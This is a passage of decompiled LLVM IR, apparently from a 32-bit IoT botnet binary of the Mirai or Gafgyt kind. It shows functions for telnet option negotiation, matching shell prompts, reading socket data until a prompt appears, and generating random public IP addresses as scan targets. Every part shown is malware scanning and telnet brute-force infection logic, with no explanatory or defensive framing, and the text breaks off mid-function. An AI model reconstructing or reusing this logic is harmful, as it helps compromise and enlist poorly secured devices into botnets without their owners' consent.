  %v1_80499a6 = add i32 %arg2, 1
  %v1_80499a7 = inttoptr i32 %v1_80499a6 to i8*
  %v2_80499a7 = load i8, i8* %v1_80499a7, align 1
  %v9_80499b0 = icmp ult i8 %v2_80499a7, -5
  br i1 %v9_80499b0, label %dec_label_pc_8049abb, label %dec_label_pc_80499bd

dec_label_pc_80499bd:                             ; preds = %entry
  %v7_80499c4 = icmp eq i8 %v2_80499a7, -1
  br i1 %v7_80499c4, label %dec_label_pc_80499c6, label %dec_label_pc_80499e0

dec_label_pc_80499c6:                             ; preds = %dec_label_pc_80499bd
  br label %dec_label_pc_8049abb

dec_label_pc_80499e0:                             ; preds = %dec_label_pc_80499bd
  store i8 -1, i8* %stack_var_-5, align 1
  %v2_80499f4 = ptrtoint i8* %stack_var_-5 to i32
  %v4_8049a01 = call i32 @__libc_send(i32 %arg1, i32 %v2_80499f4, i32 1, i32 16384)
  %v2_8049a0a = load i8, i8* %v1_80499a7, align 1
  %v11_8049a0d = icmp eq i8 %v2_8049a0a, -4
  %v1_8049a0f = icmp eq i1 %v11_8049a0d, false
  br i1 %v1_8049a0f, label %dec_label_pc_8049a17, label %dec_label_pc_8049a11

dec_label_pc_8049a11:                             ; preds = %dec_label_pc_80499e0
  store i8 -2, i8* %stack_var_-5, align 1
  br label %dec_label_pc_8049a6d

dec_label_pc_8049a17:                             ; preds = %dec_label_pc_80499e0
  %v2_8049a1b = load i8, i8* %v1_80499a7, align 1
  %v11_8049a1e = icmp eq i8 %v2_8049a1b, -2
  %v1_8049a20 = icmp eq i1 %v11_8049a1e, false
  br i1 %v1_8049a20, label %dec_label_pc_8049a28, label %dec_label_pc_8049a22

dec_label_pc_8049a22:                             ; preds = %dec_label_pc_8049a17
  store i8 -4, i8* %stack_var_-5, align 1
  br label %dec_label_pc_8049a6d

dec_label_pc_8049a28:                             ; preds = %dec_label_pc_8049a17
  %v2_8049a2c = load i8, i8* %v1_80499a7, align 1
  %v10_8049a2f = icmp eq i8 %v2_8049a2c, 3
  %v1_8049a31 = icmp eq i1 %v10_8049a2f, false
  %v11_8049a58 = icmp eq i8 %v2_8049a2c, -3
  %v1_8049a5a = icmp eq i1 %v11_8049a58, false
  br i1 %v1_8049a31, label %dec_label_pc_8049a51, label %dec_label_pc_8049a33

dec_label_pc_8049a33:                             ; preds = %dec_label_pc_8049a28
  %. = select i1 %v1_8049a5a, i8 -3, i8 -5
  store i8 %., i8* %stack_var_-5, align 1
  br label %dec_label_pc_8049a6d

dec_label_pc_8049a51:                             ; preds = %dec_label_pc_8049a28
  %.3 = select i1 %v1_8049a5a, i8 -2, i8 -4
  store i8 %.3, i8* %stack_var_-5, align 1
  br label %dec_label_pc_8049a6d

dec_label_pc_8049a6d:                             ; preds = %dec_label_pc_8049a33, %dec_label_pc_8049a22, %dec_label_pc_8049a11, %dec_label_pc_8049a51
  %v4_8049a8a = call i32 @__libc_send(i32 %arg1, i32 %v2_80499f4, i32 1, i32 16384)
  %v1_8049a92 = add i32 %arg2, 2
  %v4_8049aaf = call i32 @__libc_send(i32 %arg1, i32 %v1_8049a92, i32 1, i32 16384)
  %v2_8049abe.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8049abb

dec_label_pc_8049abb:                             ; preds = %dec_label_pc_80499c6, %dec_label_pc_8049a6d, %entry
  %v2_8049abe = phi i32 [ %v0_804999d, %dec_label_pc_80499c6 ], [ %v2_8049abe.pre, %dec_label_pc_8049a6d ], [ %v0_804999d, %entry ]
  store i32 %v2_8049abe, i32* @ebp, align 4
  ret i32 0

; uselistorder directives
  uselistorder i8* %stack_var_-5, { 5, 4, 3, 2, 0, 1 }
  uselistorder i8 -3, { 1, 0 }
  uselistorder i8 -4, { 1, 2, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8049abb, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8049a6d, { 3, 0, 1, 2 }
}

define i32 @matchPrompt(i8* %arg1) local_unnamed_addr {
entry:
  %v4_8049ace = ptrtoint i8* %arg1 to i32
  %v3_8049adf = call i32 @_strlen(i8* %arg1)
  %v4_8049adf = mul i32 %v3_8049adf, -1
  %v1_8049ae5 = sub i32 0, %v4_8049adf
  %v6_8049b0c = sub i32 %v4_8049ace, %v4_8049adf
  br label %dec_label_pc_8049b94

dec_label_pc_8049afc:                             ; preds = %dec_label_pc_8049b4f, %dec_label_pc_8049b37, %dec_label_pc_8049b1f, %dec_label_pc_8049b07
  %v4_8049afc = add nsw i32 %stack_var_-12.032, 1
  %v7_8049b05 = icmp slt i32 %v4_8049afc, %v1_8049ae5
  br i1 %v7_8049b05, label %dec_label_pc_8049b07, label %dec_label_pc_8049aff.dec_label_pc_8049b67_crit_edge

dec_label_pc_8049aff.dec_label_pc_8049b67_crit_edge: ; preds = %dec_label_pc_8049afc, %dec_label_pc_8049aff.preheader
  %stack_var_-12.0.lcssa = phi i32 [ %stack_var_-12.1, %dec_label_pc_8049aff.preheader ], [ %v4_8049afc, %dec_label_pc_8049afc ]
  %.pre = sub i32 %v6_8049b0c, %stack_var_-12.0.lcssa
  %.pre9 = inttoptr i32 %.pre to i8*
  br label %dec_label_pc_8049b67

dec_label_pc_8049b07:                             ; preds = %dec_label_pc_8049aff.preheader, %dec_label_pc_8049afc
  %stack_var_-12.032 = phi i32 [ %v4_8049afc, %dec_label_pc_8049afc ], [ %stack_var_-12.1, %dec_label_pc_8049aff.preheader ]
  %v2_8049b14 = sub i32 %v6_8049b0c, %stack_var_-12.032
  %v1_8049b18 = inttoptr i32 %v2_8049b14 to i8*
  %v2_8049b18 = load i8, i8* %v1_8049b18, align 1
  %v4_8049b1b = icmp eq i8 %v2_8049b18, 0
  br i1 %v4_8049b1b, label %dec_label_pc_8049afc, label %dec_label_pc_8049b1f

dec_label_pc_8049b1f:                             ; preds = %dec_label_pc_8049b07
  %v2_8049b30 = load i8, i8* %v1_8049b18, align 1
  %v7_8049b33 = icmp eq i8 %v2_8049b30, 32
  br i1 %v7_8049b33, label %dec_label_pc_8049afc, label %dec_label_pc_8049b37

dec_label_pc_8049b37:                             ; preds = %dec_label_pc_8049b1f
  %v2_8049b48 = load i8, i8* %v1_8049b18, align 1
  %v10_8049b4b = icmp eq i8 %v2_8049b48, 13
  br i1 %v10_8049b4b, label %dec_label_pc_8049afc, label %dec_label_pc_8049b4f

dec_label_pc_8049b4f:                             ; preds = %dec_label_pc_8049b37
  %v2_8049b60 = load i8, i8* %v1_8049b18, align 1
  %v10_8049b63 = icmp eq i8 %v2_8049b60, 10
  br i1 %v10_8049b63, label %dec_label_pc_8049afc, label %dec_label_pc_8049b67

dec_label_pc_8049b67:                             ; preds = %dec_label_pc_8049b4f, %dec_label_pc_8049aff.dec_label_pc_8049b67_crit_edge
  %stack_var_-12.022 = phi i32 [ %stack_var_-12.0.lcssa, %dec_label_pc_8049aff.dec_label_pc_8049b67_crit_edge ], [ %stack_var_-12.032, %dec_label_pc_8049b4f ]
  %v1_8049b78.pre-phi = phi i8* [ %.pre9, %dec_label_pc_8049aff.dec_label_pc_8049b67_crit_edge ], [ %v1_8049b18, %dec_label_pc_8049b4f ]
  %v2_8049b78 = load i8, i8* %v1_8049b78.pre-phi, align 1
  %v6_8049b7e = add i32 %storemerge2, ptrtoint ([6 x i8]* @global_var_805845c.37 to i32)
  %v1_8049b81 = inttoptr i32 %v6_8049b7e to i8*
  %v2_8049b81 = load i8, i8* %v1_8049b81, align 1
  %v15_8049b84 = icmp eq i8 %v2_8049b78, %v2_8049b81
  %v1_8049b86 = icmp eq i1 %v15_8049b84, false
  br i1 %v1_8049b86, label %dec_label_pc_8049b91, label %dec_label_pc_8049bbe

dec_label_pc_8049b91:                             ; preds = %dec_label_pc_8049b67
  %v4_8049b91 = add i32 %storemerge2, 1
  br label %dec_label_pc_8049b94

dec_label_pc_8049b94:                             ; preds = %entry, %dec_label_pc_8049b91
  %stack_var_-12.1 = phi i32 [ 0, %entry ], [ %stack_var_-12.022, %dec_label_pc_8049b91 ]
  %storemerge2 = phi i32 [ 0, %entry ], [ %v4_8049b91, %dec_label_pc_8049b91 ]
  %v3_8049ba8 = call i32 @_strlen(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805845c.37, i32 0, i32 0))
  %v7_8049baf = icmp ult i32 %storemerge2, %v3_8049ba8
  br i1 %v7_8049baf, label %dec_label_pc_8049aff.preheader, label %dec_label_pc_8049bbe

dec_label_pc_8049aff.preheader:                   ; preds = %dec_label_pc_8049b94
  %v7_8049b0531 = icmp slt i32 %stack_var_-12.1, %v1_8049ae5
  br i1 %v7_8049b0531, label %dec_label_pc_8049b07, label %dec_label_pc_8049aff.dec_label_pc_8049b67_crit_edge

dec_label_pc_8049bbe:                             ; preds = %dec_label_pc_8049b94, %dec_label_pc_8049b67
  %storemerge = phi i32 [ 1, %dec_label_pc_8049b67 ], [ 0, %dec_label_pc_8049b94 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %stack_var_-12.1, { 2, 1, 0 }
  uselistorder i32 %v6_8049b0c, { 1, 0 }
  uselistorder [6 x i8]* @global_var_805845c.37, { 1, 0 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8049b94, { 1, 0 }
  uselistorder label %dec_label_pc_8049aff.dec_label_pc_8049b67_crit_edge, { 1, 0 }
}

define i32 @readUntil(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i8* %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-160 = alloca i32, align 4
  store i32 %arg4, i32* %stack_var_-168, align 4
  %v2_8049c0d = ptrtoint i32* %stack_var_-160 to i32
  %tmp27 = bitcast i32* %stack_var_-160 to i8*
  %v1_8049c27 = urem i32 %arg1, 32
  %v9_8049c2a = shl i32 1, %v1_8049c27
  %v1_8049c35 = add i32 %arg1, 1
  %v2_8049c36 = ptrtoint i32* %stack_var_-168 to i32
  %v5_8049c6d = ptrtoint i8* %arg6 to i32
  %v2_8049d41 = inttoptr i32 %arg2 to i8*
  %v4_8049d4a = icmp eq i32 %arg3, 0
  %v1_8049d6b34 = add i32 %arg8, 2
  %v5_8049d7143 = icmp slt i32 %v1_8049d6b34, %arg7
  br i1 %v5_8049d7143, label %dec_label_pc_8049d73.lr.ph, label %dec_label_pc_8049d8f

dec_label_pc_8049d73.lr.ph:                       ; preds = %entry
  %v2_8049c21 = udiv i32 %arg1, 32
  %v2_8049c2a = mul nuw nsw i32 %v2_8049c21, 4
  %v3_8049c2a = add nsw i32 %v2_8049c2a, -156
  %tmp31 = icmp slt i32 %arg5, 1
  %tmp32 = icmp eq i1 %tmp31, false
  br label %dec_label_pc_8049d73

dec_label_pc_8049c03:                             ; preds = %dec_label_pc_8049d81, %dec_label_pc_8049d73
  store i32 %v2_8049c0d, i32* @edi, align 4
  %v5_8049c14 = call i8* @_memset(i8* %tmp27, i32 0, i32 32)
  %v0_8049c2a = load i32, i32* @ebp, align 4
  %v4_8049c2a = add i32 %v3_8049c2a, %v0_8049c2a
  %v5_8049c2a = inttoptr i32 %v4_8049c2a to i32*
  %v6_8049c2a = load i32, i32* %v5_8049c2a, align 4
  %v12_8049c2a = or i32 %v6_8049c2a, %v9_8049c2a
  store i32 %v12_8049c2a, i32* %v5_8049c2a, align 4
  %v5_8049c5d = call i32 @__libc_select(i32 %v1_8049c35, i32 %v2_8049c0d, i32 0, i32 0, i32 %v2_8049c36)
  %tmp28 = icmp slt i32 %v5_8049c5d, 1
  br i1 %tmp28, label %dec_label_pc_8049d8f, label %dec_label_pc_8049c6a

dec_label_pc_8049c6a:                             ; preds = %dec_label_pc_8049c03
  %v6_8049c6d = add i32 %stack_var_-32.044, %v5_8049c6d
  %v5_8049c70 = inttoptr i32 %v6_8049c6d to i8*
  %v4_8049c90 = call i32 @__libc_recv(i32 %arg1, i32 %v6_8049c6d, i32 1, i32 0)
  %v13_8049c98 = icmp eq i32 %v4_8049c90, -1
  br i1 %v13_8049c98, label %dec_label_pc_8049dab, label %dec_label_pc_8049c9e

dec_label_pc_8049c9e:                             ; preds = %dec_label_pc_8049c6a
  %v4_8049c9e = icmp eq i32 %v4_8049c90, 0
  %v1_8049ca2 = icmp eq i1 %v4_8049c9e, false
  br i1 %v1_8049ca2, label %dec_label_pc_8049cb3, label %dec_label_pc_8049dab

dec_label_pc_8049cb3:                             ; preds = %dec_label_pc_8049c9e
  %v5_8049cb6 = add i32 %v4_8049c90, %stack_var_-32.044
  %v2_8049cbc = load i8, i8* %v5_8049c70, align 1
  %v11_8049cbf = icmp eq i8 %v2_8049cbc, -1
  %v1_8049cc1 = icmp eq i1 %v11_8049cbf, false
  br i1 %v1_8049cc1, label %dec_label_pc_8049d34, label %dec_label_pc_8049cc3

dec_label_pc_8049cc3:                             ; preds = %dec_label_pc_8049cb3
  %v1_8049cc6 = add i32 %v6_8049c6d, 1
  %v4_8049ce1 = call i32 @__libc_recv(i32 %arg1, i32 %v1_8049cc6, i32 2, i32 0)
  %v13_8049ce9 = icmp eq i32 %v4_8049ce1, -1
  br i1 %v13_8049ce9, label %dec_label_pc_8049dab, label %dec_label_pc_8049cef

dec_label_pc_8049cef:                             ; preds = %dec_label_pc_8049cc3
  %v4_8049cef = icmp eq i32 %v4_8049ce1, 0
  %v1_8049cf3 = icmp eq i1 %v4_8049cef, false
  br i1 %v1_8049cf3, label %dec_label_pc_8049d04, label %dec_label_pc_8049dab

dec_label_pc_8049d04:                             ; preds = %dec_label_pc_8049cef
  %v5_8049d07 = add i32 %v4_8049ce1, %v5_8049cb6
  %v3_8049d1f = call i32 @negotiate(i32 %arg1, i32 %v6_8049c6d, i32 3)
  %v1_8049d24 = icmp eq i32 %v3_8049d1f, 0
  %v1_8049d26 = icmp eq i1 %v1_8049d24, false
  br i1 %v1_8049d26, label %dec_label_pc_8049d68.backedge, label %dec_label_pc_8049dab

dec_label_pc_8049d68.backedge:                    ; preds = %dec_label_pc_8049d04, %dec_label_pc_8049d4a, %dec_label_pc_8049d50
  %stack_var_-32.0.be = phi i32 [ %v5_8049cb6, %dec_label_pc_8049d4a ], [ %v5_8049cb6, %dec_label_pc_8049d50 ], [ %v5_8049d07, %dec_label_pc_8049d04 ]
  %v1_8049d6b = add i32 %stack_var_-32.0.be, 2
  %v5_8049d71 = icmp slt i32 %v1_8049d6b, %arg7
  br i1 %v5_8049d71, label %dec_label_pc_8049d68.backedge.dec_label_pc_8049d73_crit_edge, label %dec_label_pc_8049d8f

dec_label_pc_8049d68.backedge.dec_label_pc_8049d73_crit_edge: ; preds = %dec_label_pc_8049d68.backedge
  %v3_8049d73.pre = load i32, i32* %stack_var_-168, align 4
  br label %dec_label_pc_8049d73

dec_label_pc_8049d34:                             ; preds = %dec_label_pc_8049cb3
  %v3_8049d41 = call i32 @strstr(i32 %v5_8049c6d, i8* %v2_8049d41)
  %v1_8049d46 = icmp eq i32 %v3_8049d41, 0
  %v1_8049d48 = icmp eq i1 %v1_8049d46, false
  br i1 %v1_8049d48, label %dec_label_pc_8049d8f, label %dec_label_pc_8049d4a

dec_label_pc_8049d4a:                             ; preds = %dec_label_pc_8049d34
  br i1 %v4_8049d4a, label %dec_label_pc_8049d68.backedge, label %dec_label_pc_8049d50

dec_label_pc_8049d50:                             ; preds = %dec_label_pc_8049d4a
  %v2_8049d56 = call i32 @matchPrompt(i8* %arg6)
  %v1_8049d5b = icmp eq i32 %v2_8049d56, 0
  br i1 %v1_8049d5b, label %dec_label_pc_8049d68.backedge, label %dec_label_pc_8049d8f

dec_label_pc_8049d73:                             ; preds = %dec_label_pc_8049d68.backedge.dec_label_pc_8049d73_crit_edge, %dec_label_pc_8049d73.lr.ph
  %v3_8049d73 = phi i32 [ %arg4, %dec_label_pc_8049d73.lr.ph ], [ %v3_8049d73.pre, %dec_label_pc_8049d68.backedge.dec_label_pc_8049d73_crit_edge ]
  %stack_var_-32.044 = phi i32 [ %arg8, %dec_label_pc_8049d73.lr.ph ], [ %stack_var_-32.0.be, %dec_label_pc_8049d68.backedge.dec_label_pc_8049d73_crit_edge ]
  %tmp29 = icmp slt i32 %v3_8049d73, 1
  %tmp30 = icmp eq i1 %tmp29, false
  br i1 %tmp30, label %dec_label_pc_8049c03, label %dec_label_pc_8049d81

dec_label_pc_8049d81:                             ; preds = %dec_label_pc_8049d73
  br i1 %tmp32, label %dec_label_pc_8049c03, label %dec_label_pc_8049d8f

dec_label_pc_8049d8f:                             ; preds = %dec_label_pc_8049c03, %dec_label_pc_8049d81, %dec_label_pc_8049d68.backedge, %dec_label_pc_8049d50, %dec_label_pc_8049d34, %entry
  %stack_var_-24.0 = phi i32 [ 0, %entry ], [ 1, %dec_label_pc_8049d34 ], [ 1, %dec_label_pc_8049d50 ], [ 0, %dec_label_pc_8049d68.backedge ], [ 0, %dec_label_pc_8049d81 ], [ 0, %dec_label_pc_8049c03 ]
  br label %dec_label_pc_8049dab

dec_label_pc_8049dab:                             ; preds = %dec_label_pc_8049d04, %dec_label_pc_8049cc3, %dec_label_pc_8049cef, %dec_label_pc_8049c6a, %dec_label_pc_8049c9e, %dec_label_pc_8049d8f
  %stack_var_-172.0 = phi i32 [ %stack_var_-24.0, %dec_label_pc_8049d8f ], [ 0, %dec_label_pc_8049c9e ], [ 0, %dec_label_pc_8049c6a ], [ 0, %dec_label_pc_8049cef ], [ 0, %dec_label_pc_8049cc3 ], [ 0, %dec_label_pc_8049d04 ]
  ret i32 %stack_var_-172.0

; uselistorder directives
  uselistorder i32 %stack_var_-32.0.be, { 1, 0 }
  uselistorder i32 %v4_8049ce1, { 1, 2, 0 }
  uselistorder i32 %v4_8049c90, { 1, 2, 0 }
  uselistorder i32 %v5_8049c6d, { 1, 0 }
  uselistorder i32* %stack_var_-168, { 0, 2, 1 }
  uselistorder i32 %arg7, { 1, 0 }
  uselistorder i32 %arg1, { 5, 4, 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_8049dab, { 5, 0, 2, 1, 4, 3 }
  uselistorder label %dec_label_pc_8049d8f, { 1, 3, 4, 2, 0, 5 }
  uselistorder label %dec_label_pc_8049d68.backedge, { 2, 1, 0 }
}

define i32 @GetRandomPublicIP(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8049dbd = load i32, i32* @ebx, align 4
  store i32 %v0_8049dbd, i32* %stack_var_-8, align 4
  store i8 0, i8* bitcast (i32* @global_var_805b557.38 to i8*), align 4
  store i8 0, i8* bitcast (i32* @global_var_805b558.39 to i8*), align 8
  store i8 0, i8* @global_var_805b559.40, align 1
  store i8 0, i8* @global_var_805b55a.41, align 2
  %v1_8049ddd = call i32 @random()
  %v2_8049dff = sdiv i32 %v1_8049ddd, 51
  store i32 %v2_8049dff, i32* @ebx, align 4
  %tmp = mul i32 %v2_8049dff, -255
  %v2_8049e0f = add i32 %v1_8049ddd, %tmp
  %v14_8049e0f = trunc i32 %v2_8049e0f to i8
  store i32 %v2_8049e0f, i32* @eax, align 4
  store i8 %v14_8049e0f, i8* bitcast (i32* @global_var_805b557.38 to i8*), align 4
  %v1_8049e1d = call i32 @random()
  %v2_8049e3f = sdiv i32 %v1_8049e1d, 51
  store i32 %v2_8049e3f, i32* @ebx, align 4
  %tmp21 = mul i32 %v2_8049e3f, -255
  %v2_8049e4f = add i32 %v1_8049e1d, %tmp21
  %v14_8049e4f = trunc i32 %v2_8049e4f to i8
  store i32 %v2_8049e4f, i32* @eax, align 4
  store i8 %v14_8049e4f, i8* bitcast (i32* @global_var_805b558.39 to i8*), align 8
  %v1_8049e5d = call i32 @random()
  %v2_8049e7f = sdiv i32 %v1_8049e5d, 51
  store i32 %v2_8049e7f, i32* @ebx, align 4
  %tmp22 = mul i32 %v2_8049e7f, -255
  %v2_8049e8f = add i32 %v1_8049e5d, %tmp22
  %v14_8049e8f = trunc i32 %v2_8049e8f to i8
  store i32 %v2_8049e8f, i32* @eax, align 4
  store i8 %v14_8049e8f, i8* @global_var_805b559.40, align 1
  %v1_8049e9d = call i32 @random()
  %v2_8049ebf = sdiv i32 %v1_8049e9d, 51
  store i32 %v2_8049ebf, i32* @ebx, align 4
  %tmp23 = mul i32 %v2_8049ebf, -255
  %v2_8049ecf = add i32 %v1_8049e9d, %tmp23
  %v14_8049ecf = trunc i32 %v2_8049ecf to i8
  store i32 %v2_8049ecf, i32* @eax, align 4
  store i8 %v14_8049ecf, i8* @global_var_805b55a.41, align 2
  %v1_8049edd = call i32 @random()
  %v2_8049efa = srem i32 %v1_8049edd, 208
  %v12_8049f14 = icmp eq i32 %v2_8049efa, 0
  store i32 %v2_8049efa, i32* @edx, align 4
  %v1_8049f1f = icmp eq i1 %v12_8049f14, false
  br i1 %v1_8049f1f, label %dec_label_pc_8049f51, label %dec_label_pc_8049f21

dec_label_pc_8049f21:                             ; preds = %entry
  %v0_8049f21 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_8049f21 = zext i8 %v0_8049f21 to i32
  store i32 %v1_8049f21, i32* @edx, align 4
  %v0_8049f2b = load i8, i8* @global_var_805b559.40, align 1
  %v1_8049f2b = zext i8 %v0_8049f2b to i32
  %v2_8049f3a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049f3a, i32* @ebx, align 4
  %v4_8049f4c = call i32 @szprintf(i32 %v2_8049f3a, i32 ptrtoint ([12 x i8]* @global_var_8058463.42 to i32), i32 %v1_8049f2b)
  br label %dec_label_pc_8049f51

dec_label_pc_8049f51:                             ; preds = %entry, %dec_label_pc_8049f21
  %v13_8049f51 = icmp eq i32 %v2_8049efa, 1
  %v1_8049f55 = icmp eq i1 %v13_8049f51, false
  br i1 %v1_8049f55, label %dec_label_pc_8049f87, label %dec_label_pc_8049f57

dec_label_pc_8049f57:                             ; preds = %dec_label_pc_8049f51
  %v0_8049f57 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_8049f57 = zext i8 %v0_8049f57 to i32
  store i32 %v1_8049f57, i32* @edx, align 4
  %v0_8049f61 = load i8, i8* @global_var_805b559.40, align 1
  %v1_8049f61 = zext i8 %v0_8049f61 to i32
  %v2_8049f70 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049f70, i32* @ebx, align 4
  %v4_8049f82 = call i32 @szprintf(i32 %v2_8049f70, i32 ptrtoint ([15 x i8]* @global_var_805846f.43 to i32), i32 %v1_8049f61)
  br label %dec_label_pc_8049f87

dec_label_pc_8049f87:                             ; preds = %dec_label_pc_8049f51, %dec_label_pc_8049f57
  %v13_8049f87 = icmp eq i32 %v2_8049efa, 2
  %v1_8049f8b = icmp eq i1 %v13_8049f87, false
  br i1 %v1_8049f8b, label %dec_label_pc_8049fbd, label %dec_label_pc_8049f8d

dec_label_pc_8049f8d:                             ; preds = %dec_label_pc_8049f87
  %v0_8049f8d = load i8, i8* @global_var_805b55a.41, align 2
  %v1_8049f8d = zext i8 %v0_8049f8d to i32
  store i32 %v1_8049f8d, i32* @edx, align 4
  %v0_8049f97 = load i8, i8* @global_var_805b559.40, align 1
  %v1_8049f97 = zext i8 %v0_8049f97 to i32
  %v2_8049fa6 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049fa6, i32* @ebx, align 4
  %v4_8049fb8 = call i32 @szprintf(i32 %v2_8049fa6, i32 ptrtoint ([12 x i8]* @global_var_805847e.44 to i32), i32 %v1_8049f97)
  br label %dec_label_pc_8049fbd

dec_label_pc_8049fbd:                             ; preds = %dec_label_pc_8049f87, %dec_label_pc_8049f8d
  %v13_8049fbd = icmp eq i32 %v2_8049efa, 3
  %v1_8049fc1 = icmp eq i1 %v13_8049fbd, false
  br i1 %v1_8049fc1, label %dec_label_pc_8049ff3, label %dec_label_pc_8049fc3

dec_label_pc_8049fc3:                             ; preds = %dec_label_pc_8049fbd
  %v0_8049fc3 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_8049fc3 = zext i8 %v0_8049fc3 to i32
  store i32 %v1_8049fc3, i32* @edx, align 4
  %v0_8049fcd = load i8, i8* @global_var_805b559.40, align 1
  %v1_8049fcd = zext i8 %v0_8049fcd to i32
  %v2_8049fdc = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049fdc, i32* @ebx, align 4
  %v4_8049fee = call i32 @szprintf(i32 %v2_8049fdc, i32 ptrtoint ([13 x i8]* @global_var_805848a.45 to i32), i32 %v1_8049fcd)
  br label %dec_label_pc_8049ff3

dec_label_pc_8049ff3:                             ; preds = %dec_label_pc_8049fbd, %dec_label_pc_8049fc3
  %v13_8049ff3 = icmp eq i32 %v2_8049efa, 4
  %v1_8049ff7 = icmp eq i1 %v13_8049ff3, false
  br i1 %v1_8049ff7, label %dec_label_pc_804a029, label %dec_label_pc_8049ff9

dec_label_pc_8049ff9:                             ; preds = %dec_label_pc_8049ff3
  %v0_8049ff9 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_8049ff9 = zext i8 %v0_8049ff9 to i32
  store i32 %v1_8049ff9, i32* @edx, align 4
  %v0_804a003 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804a003 = zext i8 %v0_804a003 to i32
  %v2_804a012 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a012, i32* @ebx, align 4
  %v4_804a024 = call i32 @szprintf(i32 %v2_804a012, i32 ptrtoint ([11 x i8]* @global_var_8058497.46 to i32), i32 %v1_804a003)
  br label %dec_label_pc_804a029

dec_label_pc_804a029:                             ; preds = %dec_label_pc_8049ff3, %dec_label_pc_8049ff9
  %v13_804a029 = icmp eq i32 %v2_8049efa, 5
  %v1_804a02d = icmp eq i1 %v13_804a029, false
  br i1 %v1_804a02d, label %dec_label_pc_804a05f, label %dec_label_pc_804a02f

dec_label_pc_804a02f:                             ; preds = %dec_label_pc_804a029
  %v0_804a02f = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804a02f = zext i8 %v0_804a02f to i32
  store i32 %v1_804a02f, i32* @edx, align 4
  %v0_804a039 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804a039 = zext i8 %v0_804a039 to i32
  %v2_804a048 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a048, i32* @ebx, align 4
  %v4_804a05a = call i32 @szprintf(i32 %v2_804a048, i32 ptrtoint ([14 x i8]* @global_var_80584a2.47 to i32), i32 %v1_804a039)
  br label %dec_label_pc_804a05f

dec_label_pc_804a05f:                             ; preds = %dec_label_pc_804a029, %dec_label_pc_804a02f
  %v13_804a05f = icmp eq i32 %v2_8049efa, 6
  %v1_804a063 = icmp eq i1 %v13_804a05f, false
  br i1 %v1_804a063, label %dec_label_pc_804a095, label %dec_label_pc_804a065

dec_label_pc_804a065:                             ; preds = %dec_label_pc_804a05f
  %v0_804a065 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804a065 = zext i8 %v0_804a065 to i32
  store i32 %v1_804a065, i32* @edx, align 4
  %v0_804a06f = load i8, i8* @global_var_805b559.40, align 1
  %v1_804a06f = zext i8 %v0_804a06f to i32
  %v2_804a07e = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a07e, i32* @ebx, align 4
  %v4_804a090 = call i32 @szprintf(i32 %v2_804a07e, i32 ptrtoint ([12 x i8]* @global_var_80584b0.48 to i32), i32 %v1_804a06f)
  br label %dec_label_pc_804a095

dec_label_pc_804a095:                             ; preds = %dec_label_pc_804a05f, %dec_label_pc_804a065
  %v13_804a095 = icmp eq i32 %v2_8049efa, 7
  %v1_804a099 = icmp eq i1 %v13_804a095, false
  br i1 %v1_804a099, label %dec_label_pc_804a0cb, label %dec_label_pc_804a09b

dec_label_pc_804a09b:                             ; preds = %dec_label_pc_804a095
  %v0_804a09b = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804a09b = zext i8 %v0_804a09b to i32
  store i32 %v1_804a09b, i32* @edx, align 4
  %v0_804a0a5 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804a0a5 = zext i8 %v0_804a0a5 to i32
  %v2_804a0b4 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a0b4, i32* @ebx, align 4
  %v4_804a0c6 = call i32 @szprintf(i32 %v2_804a0b4, i32 ptrtoint ([13 x i8]* @global_var_80584bc.49 to i32), i32 %v1_804a0a5)
  br label %dec_label_pc_804a0cb

dec_label_pc_804a0cb:                             ; preds = %dec_label_pc_804a095, %dec_label_pc_804a09b
  %v13_804a0cb = icmp eq i32 %v2_8049efa, 8
  %v1_804a0cf = icmp eq i1 %v13_804a0cb, false
  br i1 %v1_804a0cf, label %dec_label_pc_804a101, label %dec_label_pc_804a0d1

dec_label_pc_804a0d1:                             ; preds = %dec_label_pc_804a0cb
  %v0_804a0d1 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804a0d1 = zext i8 %v0_804a0d1 to i32
  store i32 %v1_804a0d1, i32* @edx, align 4
  %v0_804a0db = load i8, i8* @global_var_805b559.40, align 1
  %v1_804a0db = zext i8 %v0_804a0db to i32
  %v2_804a0ea = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a0ea, i32* @ebx, align 4
  %v4_804a0fc = call i32 @szprintf(i32 %v2_804a0ea, i32 ptrtoint ([14 x i8]* @global_var_80584c9.50 to i32), i32 %v1_804a0db)
  br label %dec_label_pc_804a101

dec_label_pc_804a101:                             ; preds = %dec_label_pc_804a0cb, %dec_label_pc_804a0d1
  %v13_804a101 = icmp eq i32 %v2_8049efa, 9
  %v1_804a105 = icmp eq i1 %v13_804a101, false
  br i1 %v1_804a105, label %dec_label_pc_804a137, label %dec_label_pc_804a107

